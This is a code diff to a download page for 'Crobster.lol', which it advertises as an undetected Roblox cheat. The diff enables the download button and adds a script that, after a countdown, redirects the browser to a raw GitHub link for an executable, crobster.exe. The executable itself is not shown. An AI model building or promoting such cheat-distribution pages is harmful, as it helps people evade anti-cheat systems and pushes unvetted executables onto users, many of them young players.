@@ -180,8 +180,8 @@
         <h1>Download Crobster.lol</h1>
         <p class="subtitle">Get the most advanced undetected Roblox cheat today</p>
         
-        <button id="downloadBtn" class="btn" disabled>Download Unavailable</button>
-        <p class="redirect-notice">Downloads are currently unavailable</p>
+        <button id="downloadBtn" class="btn">Download v0.127</button>
+        <p class="redirect-notice">You will be redirected to our secure download server</p>
         
         <div class="download-steps">
             <h2>Installation Guide</h2>
@@ -216,5 +216,35 @@
         <p>© 2025 Crobster.lol | Not affiliated with Roblox Corporation</p>
         <p style="margin-top: 10px; font-size: 14px;">Use at your own risk. No refunds.</p>
     </footer>
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            const btn = this;
+            const originalText = btn.textContent;
+            
+            // Disable the button during countdown
+            btn.disabled = true;
+            
+            // Change button text to show countdown
+            let seconds = 3;
+            btn.textContent = `Download starts in ${seconds}...`;
+            
+            const countdown = setInterval(() => {
+                seconds--;
+                btn.textContent = `Download starts in ${seconds}...`;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = 'https://github.com/kaspuh/x/raw/refs/heads/main/crobster.exe';
+                    
+                    // Reset button after a short delay (in case redirect is blocked)
+                    setTimeout(() => {
+                        btn.textContent = originalText;
+                        btn.disabled = false;
+                    }, 3000);
+                }
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
